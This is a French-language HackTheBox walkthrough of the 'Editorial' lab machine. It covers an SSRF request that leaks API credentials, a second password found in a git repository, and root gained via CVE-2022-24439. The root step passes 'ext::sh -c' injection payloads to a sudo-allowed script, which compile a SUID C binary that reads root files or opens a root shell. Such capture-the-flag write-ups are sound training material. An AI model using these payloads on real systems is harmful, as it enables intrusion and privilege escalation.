---
title: HTB | Editorial
description: Editorial is an easy difficulty Linux machine that features a publishing web application vulnerable to Server-Side Request Forgery (SSRF). This vulnerability is leveraged to gain access to an internal running API, which is then leveraged to obtain credentials that lead to SSH access to the machine. Enumerating the system further reveals a Git repository that is leveraged to reveal credentials for a new user. The root user can be obtained by exploiting CVE-2022-24439 and the sudo configuration.
slug: editorial-htb
date: 2024-08-06 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Editorial cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Editorial</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.20</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.65s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
7002/tcp filtered afs3-prserver
```

### Notes
```bash
submissions@tiempoarriba.htb
http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

## Foothold

### SSRF

```bash
POST /upload-cover HTTP/1.1
...
------WebKitFormBoundaryNBB1NG9hyA1AyOej
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:5000/api/latest/metadata/messages/authors
------WebKitFormBoundaryNBB1NG9hyA1AyOej
Content-Disposition: form-data; name="bookfile"; filename="2664593.png"
Content-Type: image/png

PNG
...
```
Dans la réponse de l'api, on obtient les creds :
user: dev
password: dev080217_devAPI!@
```bash
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 04 Aug 2024 23:44:11 GMT
Content-Type: application/octet-stream
Content-Length: 506
Connection: keep-alive
Content-Disposition: inline; filename=f84e3727-b58e-4a33-8cae-f439b5a6a997
Last-Modified: Sun, 04 Aug 2024 23:44:11 GMT
Cache-Control: no-cache
ETag: "1722815051.1237798-506-4116584587"

{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

### SSH to user and prod
On trouve repo git. En se deplacant dans les commits :

En se connectant a user, on trouve un fichier python avec les creds d'un autre utilisateur:
user: prod
pass: 080217_Producti0n_2023!@
```bash
 api_mail_new_authors():
    return jsonify({
        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
```

## Privilege Escalation
On utilise le compte prod.

### Enumeration
```bash
prod@editorial:~$ sudo -l
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

### clone_prod_change.py as root
```bash
cat exploit.c 
##include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("cat /root/root.txt");
    return 0;
}
```
Ensuite, on compile le fichier en tant que root. Le fichier `exploit` est donc créer avec le owner `root`. Il suffit ensuite d'executer un chmod +s, ce qui met le bit SUID à 1. Le bit SUID permet d'executer un binaire comme ci on était le owner, même si on est pas connecté en tant que root.
Lors de l'execution du binaire, on effectue un cat et on obtient le flag root
```bash
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c gcc% /home/prod/exploit.c% -o% /home/prod/exploit"
...
...
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c chmod% +s% /home/prod/exploit"
...
...
prod@editorial:~$ ls -l
...
-rwsr-sr-x 1 root root 16048 Aug  5 22:47 exploit
-rw-rw-r-- 1 prod prod   114 Aug  5 22:45 exploit.c
prod@editorial:~$ ./exploit 
7e05.....dea0
```

### BONUS
Permet d'obtenir un shell. Aussi simple que l'autre...
```bash
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```
```bash
## Commandes pour compiler et le chmod +s...
## ....
prod@editorial:~$ ./exploit2
root@editorial:~# whoami
root
root@editorial:~# cd /root
root@editorial:/root# ls
root.txt
root@editorial:/root# cat root.txt 
7e05.....dea0
```

### BONUS FINAL
Il y avait beaucoup plus rapide... On fait un cat puis on met dans le /home de prod... Il reste plus qu'a faire un cat du fichier...
```bash
$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c cat% /root/root.txt% >% /home/prod/hehe"
$ cat hehe 
7e05.....dea0
```